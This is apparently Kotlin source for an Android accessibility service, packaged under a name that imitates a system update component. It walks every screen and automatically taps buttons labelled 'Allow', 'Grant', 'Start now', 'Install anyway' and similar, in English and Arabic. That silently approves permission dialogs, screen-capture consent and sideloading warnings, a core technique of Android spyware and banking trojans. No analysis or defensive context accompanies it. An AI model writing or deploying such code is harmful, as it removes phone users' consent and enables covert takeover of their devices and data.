package com.android.system.update.core

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoPermissionService : AccessibilityService() {

    private val tag = "AutoPermService"

    private val targetTexts = listOf(
        "Allow", "Grant", "While using the app", "Start now", "OK", "Accept", "Install anyway",
        "سماح", "أثناء استخدام التطبيق", "البدء الآن", "موافق", "قبول", "تثبيت على أي حال"
    )

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            
            val rootNode = rootInActiveWindow ?: return
            processNode(rootNode)
        }
    }

    private fun processNode(node: AccessibilityNodeInfo?) {
        if (node == null) return

        val nodeText = node.text?.toString()
        if (!nodeText.isNullOrEmpty()) {
            if (targetTexts.any { nodeText.contains(it, ignoreCase = true) }) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(tag, "Action triggered on: $nodeText")
                } else {
                    node.parent?.let {
                        if (it.isClickable) {
                            it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        }
                    }
                }
            }
        }

        for (i in 0 until node.childCount) {
            processNode(node.getChild(i))
        }
    }

    override fun onInterrupt() {
        Log.w(tag, "Service Interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(tag, "Accessibility Service Connected and Ready")
    }
}